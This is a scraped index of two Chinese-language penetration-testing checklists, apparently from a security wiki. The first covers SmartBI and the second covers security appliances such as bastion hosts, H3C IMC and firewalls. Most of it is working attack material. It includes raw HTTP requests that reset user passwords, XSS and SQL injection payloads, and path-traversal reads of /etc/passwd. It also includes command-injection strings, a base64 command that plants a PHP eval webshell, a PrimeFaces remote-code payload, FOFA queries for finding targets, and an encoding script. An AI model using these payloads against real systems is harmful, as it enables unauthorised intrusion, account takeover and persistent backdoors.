","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:3:0","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 敏感信息 查看版本 https://127.0.0.1/vision/version.txt https://127.0.0.1/vision/packageinfo.txt 目录遍历 https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR\u0026root=%2F 信息泄露 https://127.0.0.1/vision/monitor/sysprops.jsp https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode https://127.0.0.1/vision/monitor/hardwareinfo.jsp 接口泄露 直接访问 wsdl 无需 401： https://127.0.0.1/vision/listwsdl.jsp 提供资源目录树的访问功能： https://127.0.0.1/vision/services/CatalogService?wsdl SimpleReportService 提供灵活报表相关操作功能： https://127.0.0.1/vision/services/SimpleReportService?wsdl BusinessViewService 提供数据集定义相关操作功能： https://127.0.0.1/vision/services/BusinessViewService?wsdl DataSourceService 提供数据源相关操作功能： https://127.0.0.1/vision/services/DataSourceService?wsdl AnalysisReportService 提供多维分析相关操作功能： https://127.0.0.1/vision/services/AnalysisReportService?wsdl UserManagerService 提供用户相关操作，包括读取/维护用户信息、读取/维护组信息、读取/维护角色信息、为用户和组分配角色等： https://127.0.0.1/vision/services/UserManagerService?wsdl ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:3:1","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 Session劫持 可重置用户密码，且无需原密码。 https://127.0.0.1/vision/monitor/listsessions.jsp 理论上重置成功，返回为 true，但是实际测试过程中修改后的密码既不是改之前的密码，也不是修改后的密码，过一段时间自动重置为原来的密码。 POST /vision/RMIServlet HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://127.0.0.1/vision/index.jsp If-Modified-Since: 0 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Content-Length: 148 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299 className=UserService\u0026methodName=updateUserForChange\u0026params=[\"I8a94ca4e0175ab4aab4aaae90175d3e824c66a87\",\"zhongguo1\",\"null\",\"QWEqwe123\",true] POST /vision/RMIServlet HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://127.0.0.1/vision/index.jsp If-Modified-Since: 0 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Content-Length: 133 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299 className=UserService\u0026methodName=addUserAttribute\u0026params=[\"I8a94ca4e0175ab4aab4aaae90175d3e824c66a87\",\"SYSTEM_user_isEdit\",\"0\",null] 其中I8a94ca4e0175ab4aab4aaae90175d3e824c66a87为用户的id字段，唯一身份标识。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:3:2","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x03 Heapdump泄露 https://127.0.0.1/vision/monitor/heapdump.jsp https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:3:3","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x04 反射型/存储型XSS https://127.0.0.1/vision/chooser.jsp?key=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E\u0026root=/u01/data/domains/app_domain https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com\u0026user=111%22%3E%3Cimg%20src=x%20onerror=prompt(0)%3E\u0026pass=123456 登录后个人参数位置，加密后传参可导致存储型 xss。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:3:4","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x05 SSRF 探测出口ip： https://127.0.0.1/vision/monitor/testmailserver.jsp ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:3:5","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"四、SQL注入 需要登录，任意报表功能，例如： https://127.0.0.1/vision/ssreportServlet POST /vision/ssreportServlet HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://127.0.0.1/vision/openresource.jsp?iPad=true\u0026refresh=true\u0026showtoolbar=false\u0026showPath=false\u0026resid=I40281d81016a8bc28bc20231016aaee007b230ac\u0026_timestamp=1610433924926 Content-Type: application/x-www-form-urlencoded Content-Length: 3293 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Cookie: FQPassword=; JSESSIONID=4BB550BF10C606619B753D3CE52CD3AB Upgrade-Insecure-Requests: 1 sheetIndex=0\u0026resid=I40281d81016a8bc28bc20231016aaee007b230ac\u0026clientId=Iff8080810176f0c7f0c7544f0176f54eb72c1160\u0026refreshType=refresh\u0026paramsInfoEncode=encode=/JV/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uu6(dp/uu/NO/uu/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uu(SR(D/uu/NO/uu/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uug(SQp/uu/NO/uun111/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uun111/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uug(SQp/uu/NO/uuKK7777/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/Vm/Vx/aK/V'/mt/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/'J/O'/am/'N/O'/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/'J/O'/am/'N/O'/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~MqRh/uu/ut/uu6(dp/uu/NO/uuRh/uu/ut/uu(SR(D/uu/NO/uu/aM/ON/'7/aM/VJ/'V/aM/mt/VO/aM/ma/'KRh/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu6(dp/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu(SR(D/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu6(dp/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu(SR(D/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu6(dp/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu(SR(D/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu6(dp/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu(SR(D/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/JT\u0026pageId","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:4:0","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"五、任意文件读取 V85以下的可能任意文件下载都有，V95版本不存在。 https://127.0.0.1/vision/FileServlet?ftpType=out\u0026path=upload/../../../../../../../../../../etc/passwd\u0026name=%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:5:0","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"附录、RMIServet加解密 SmartBi 有两种传参方式，RMIServlet 加密或直接传输。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:6:0","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 RMIServlet加密 POST /vision/RMIServlet HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://127.0.0.1/vision/index.jsp If-Modified-Since: 0 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Content-Length: 148 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299 encode=zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+/JV/uuc'(mKi(Kp719J(~K((~K(((pm719JhNp'uKiMM('9/uu/ut/uuXIw6--Qw1/uu/ut/uu6QSS/uu/ut/uuY!a0bp1uN/uu/utk4Qp/JT ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:6:1","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 直接传输 上述encode加密字段解密后为： UserService+updateUserForChange+[\"I8a94ca4e0175ab4aab4aaae90175d3e824c66a87\",\"zhongguo1\",\"null\",\"QWEqwe123\",true] 等同于： className=UserService\u0026methodName=updateUserForChange\u0026params=[\"I8a94ca4e0175ab4aab4aaae90175d3e824c66a87\",\"zhongguo1\",\"null\",\"QWEqwe123\",true] 构造数据包： POST /vision/RMIServlet HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://127.0.0.1/vision/index.jsp If-Modified-Since: 0 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Content-Length: 148 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299 className=UserService\u0026methodName=updateUserForChange\u0026params=[\"I8a94ca4e0175ab4aab4aaae90175d3e824c66a87\",\"zhongguo1\",\"null\",\"QWEqwe123\",true] ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:6:2","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x03 RMIServet加解密脚本 from urllib.parse import unquote from urllib.parse import quote ENCODING_SCHEDULE = { \"0\": \"7\", \"1\": \"1\", \"2\": \"u\", \"3\": \"N\", \"4\": \"K\", \"5\": \"J\", \"6\": \"M\", \"7\": \"9\", \"8\": \"'\", \"9\": \"m\", \"!\": \"P\", \"%\": \"/\", \"'\": \"n\", \"(\": \"A\", \")\": \"E\", \"*\": \"s\", \"+\": \"+\", \"-\": \"f\", \".\": \"q\", \"A\": \"O\", \"B\": \"V\", \"C\": \"t\", \"D\": \"T\", \"E\": \"a\", \"F\": \"x\", \"G\": \"H\", \"H\": \"r\", \"I\": \"c\", \"J\": \"v\", \"K\": \"l\", \"L\": \"8\", \"M\": \"F\", \"N\": \"3\", \"O\": \"o\", \"P\": \"L\", \"Q\": \"Y\", \"R\": \"j\", \"S\": \"W\", \"T\": \"*\", \"U\": \"z\", \"V\": \"Z\", \"W\": \"!\", \"X\": \"B\", \"Y\": \")\", \"Z\": \"U\", \"a\": \"(\", \"b\": \"~\", \"c\": \"i\", \"d\": \"h\", \"e\": \"p\", \"f\": \"_\", \"g\": \"-\", \"h\": \"I\", \"i\": \"R\", \"j\": \".\", \"k\": \"G\", \"l\": \"S\", \"m\": \"d\", \"n\": \"6\", \"o\": \"w\", \"p\": \"5\", \"q\": \"0\", \"r\": \"4\", \"s\": \"D\", \"t\": \"k\", \"u\": \"Q\", \"v\": \"g\", \"w\": \"b\", \"x\": \"C\", \"y\": \"2\", \"z\": \"X\", \"~\": \"e\", \"_\": \"y\", } DECODING_SCHEDULE = { \"7\": \"0\", \"1\": \"1\", \"u\": \"2\", \"N\": \"3\", \"K\": \"4\", \"J\": \"5\", \"M\": \"6\", \"9\": \"7\", \"'\": \"8\", \"m\": \"9\", \"P\": \"!\", \"/\": \"%\", \"n\": \"'\", \"A\": \"(\", \"E\": \")\", \"s\": \"*\", \"+\": \"+\", \"f\": \"-\", \"q\": \".\", \"O\": \"A\", \"V\": \"B\", \"t\": \"C\", \"T\": \"D\", \"a\": \"E\", \"x\": \"F\", \"H\": \"G\", \"r\": \"H\", \"c\": \"I\", \"v\": \"J\", \"l\": \"K\", \"8\": \"L\", \"F\": \"M\", \"3\": \"N\", \"o\": \"O\", \"L\": \"P\", \"Y\": \"Q\", \"j\": \"R\", \"W\": \"S\", \"*\": \"T\", \"z\": \"U\", \"Z\": \"V\", \"!\": \"W\", \"B\": \"X\", \")\": \"Y\", \"U\": \"Z\", \"(\": \"a\", \"~\": \"b\", \"i\": \"c\", \"h\": \"d\", \"p\": \"e\", \"_\": \"f\", \"-\": \"g\", \"I\": \"h\", \"R\": \"i\", \".\": \"j\", \"G\": \"k\", \"S\": \"l\", \"d\": \"m\", \"6\": \"n\", \"w\": \"o\", \"5\": \"p\", \"0\": \"q\", \"4\": \"r\", \"D\": \"s\", \"k\": \"t\", \"Q\": \"u\", \"g\": \"v\", \"b\": \"w\", \"C\": \"x\", \"2\": \"y\", \"X\": \"z\", \"e\": \"~\", \"y\": \"_\", } #此函数可以用来加密明文也可以解密服务器返回的密文 def encode(code): out = \"\" for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return out def decode(code): out = \"\" for item in code: out = out + DECODING_SCHEDULE.get(item, item) return out def read(): with open('read.txt', 'r') as f: return f.read() a=read() b = decode(a) c = encode(a) print('Input: ' + a + '\\n') print('decode: ' + b + '\\n') print('decode-unquote-url: '+unquote(b,'utf-8')) print('encode: '+c) 注：加密和解密的过程就是替换字符的过程，最终解密得到的是 url 编码，加密时传入的文本也要是 url 编码。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:6:3","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"安全设备漏洞 Checklist 更新时间：2023.06 【免责声明】本项目所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，不得将其用于非授权渗透测试，否则后果自行承担，与本项目无关。使用本项目前请先阅读 法律法规 。 ✅ 表示漏洞文档已收录 Vulnerability-Wiki 漏洞库，仅收录2022/2023年部分安全设备，全部 iot 漏洞列表见 README.md 。参考阅读：ffffffff0x/SecDevice-Exploits ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"一、身份与访问控制 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 堡垒机 齐智堡垒机 FOFA： app=\"齐治科技-堡垒机\" 默认口令 shterm/shterm shterm命令执行 tui.update.php POST /shterm/listener/tui_update.php a=[\"t';import os;os.popen('whoami')#\"] 前台命令执行 cluster_manage.php CNVD-2019-20835 访问以下路径，返回 ok： http://10.20.10.11/listener/cluster_manage.php 写入webshell： /var/www/shterm/resources/qrcode/lbj77.php 密码10086 https://10.20.10.10/ha_request.php?action=install\u0026ipaddr=10.20.10.11\u0026node_id=1${IFS}|`echo${IFS}\" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK\"|base64${IFS}- d|bash`|${IFS}|echo${IFS} 后台命令执行 data_provider.php CNVD-2019-17294 POST /audit/data_provider.php?ds_y=2019\u0026ds_m=03\u0026ds_d=02\u0026ds_hour=01\u0026ds_min=40\u0026server_cond=\u0026service=`id`\u0026identity_cond=\u0026query_type=all\u0026format=json\u0026browse=true Host: your-ip page=1\u0026rp=30\u0026sortname=stampl\u0026sortorder=desc\u0026query=\u0026qtype= 任意用户登录 /audit/gui_detail_view.php?token=1\u0026id=%5C\u0026uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23\u0026login=shterm H3C SecPath FOFA： app=\"H3C-SecPath-运维审计系统\" \u0026\u0026 body=\"2018\" Teleport 堡垒机 FOFA： app=\"TELEPORT堡垒机\" 任意用户登录 返回 code 为 0 说明成功，刷新首页即可进入后台： POST /auth/do-login args={\"type\":2,\"username\":\"admin\",\"password\":null,\"captcha\":\"xxxx\",\"oath\":\"\",\"remember\":false} 后台文件读取 /audit/get-file?f=/etc/passwd\u0026rid=1\u0026type=rdp\u0026act=read\u0026amp;offset=0 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:1:1","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 IMC H3C IMC 智能管理中心 FOFA： \"/imc/javax.faces.resource/images/login_logo_h3c.png.jsf?ln=primefaces-imc-new-webui\" body=\"/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui\" body=\"iMC来宾接入自助管理系统\" 远程代码执行 POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Content-Type: application/x-www-form-urlencoded Content-Length: 1567 pfdrt=sc\u0026ln=primefaces\u0026pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D\u0026cmd=whoami ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:1:2","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"二、网络检测与响应 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 蜜罐 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:1","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 IDS 绿盟 UTS 综合威胁探针 管理员任意登录 输入 admin/任意密码，点击登录。更改响应包，将 {“status”:false,…} 中的 false 改为 true，此时，响应包将泄露 admin 用户密码的 md5 值。 利用 md5 值登录页面： POST /webapi/v1/authen_user {\"username\":\"admin\",\"password\":md5} ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:2","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x03 防火墙 安恒 明御WEB应用防火墙 FOFA： app=\"安恒信息-明御WAF\" report.php 任意用户登录✅ 漏洞指纹： /report.m?a=rpc-timed /system.m?a=reserved Cisco ASA app=\"CISCO-ASA-5520\" 拒绝服务/敏感信息获取 CVE-2018-0296 exp： https://github.com/yassineaboukir/CVE-2018-0296 https://github.com/milo2012/CVE-2018-0296 任意文件删除 CVE-2020-3187 exp： https://packetstormsecurity.com/files/158648/Cisco-Adaptive-Security-Appliance-Software-9.7-Arbitrary-File-Deletion.html 目录穿越/任意文件读取 CVE-2020-3452 漏洞影响 Cisco ASA 设备影响版本： \u003c9.6.1 9.6 \u003c 9.6.4.42 9.71 9.8 \u003c 9.8.4.20 9.9 \u003c 9.9.2.74 9.10 \u003c 9.10.1.42 9.12 \u003c 9.12.3.12 9.13 \u003c 9.13.1.10 9.14 \u003c 9.14.1.10 /+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../ H3C SecPath下一代防火墙 FOFA： title=\"Web user login\" 任意文件下载 ✅ /webui/?g=sys_dia_data_check\u0026file_name=../../etc/passwd /webui/? g=sys_capture_file_download\u0026name=../../../../../../../../etc/passwd 奇安信 网康下一代防火墙 FOFA： app=\"网康科技-下一代防火墙\" 远程命令执行 ✅ POST /directdata/direct/router HTTP/1.1 